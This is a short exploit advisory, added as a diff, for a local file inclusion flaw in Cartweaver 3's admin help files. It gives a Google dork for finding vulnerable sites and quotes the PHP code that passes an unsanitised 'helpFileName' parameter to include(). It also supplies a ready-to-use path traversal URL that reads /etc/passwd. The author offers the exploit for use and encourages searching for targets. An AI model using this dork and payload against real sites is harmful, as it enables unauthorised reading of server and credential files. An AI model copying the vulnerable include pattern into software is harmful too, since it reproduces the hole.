@@ -1,0 +1,23 @@
+# Exploit Title: Cartweaver 3 LFI exploit
+# Google Dork: inurl:cw3/admin/ inurl:/admin/helpfiles/ ~ Be creative!
+# Date: 13.10.2012
+# Exploit Author: HaxOr
+# Vendor Homepage: https://www.cartweaver.com
+# Version: 3
+# Tested on: Windows 7 and Windows 8
+
+Vulnerability is in the Help Documents located in /admin/helpfiles/.
+=============================
+AdminHelp.php ~ lines 42-44
+=============================
+
+<?php /* Help File Body Include, populated by helpFileName variable */
+$helpFileName = isset($_GET["helpFileName"]) ? $_GET["helpFileName"] : "AdminHome.php";
+include("help_" . $helpFileName);?>
+
+Few sites affected:
+
+http://server/cw3/admin/helpfiles/AdminHelp.php?helpFileName=a/../../../../../../../../../../../../etc/passwd
+
+
+Greetings to all members of Team INTRA<3
